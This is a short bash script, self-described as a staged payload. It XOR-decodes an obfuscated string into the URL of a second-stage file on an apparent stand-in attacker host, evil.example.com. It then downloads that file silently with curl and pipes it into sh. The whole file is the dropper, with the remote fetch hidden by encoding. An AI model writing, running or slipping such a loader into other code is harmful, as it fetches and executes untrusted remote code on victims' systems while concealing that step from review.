#!/bin/bash
# staged payload, single-byte XOR (key 88)
enc="0,,(+bww=.14v= 95(4=v;75w+,9?=jw(9!479<v= ="
key=88
url=""
for ((i=0; i<${#enc}; i++)); do
  printf -v c '%d' "'${enc:i:1}"
  url+=$(printf "\\$(printf '%03o' $((c ^ key)))")   # XOR each byte
done
curl -s "$url" | sh
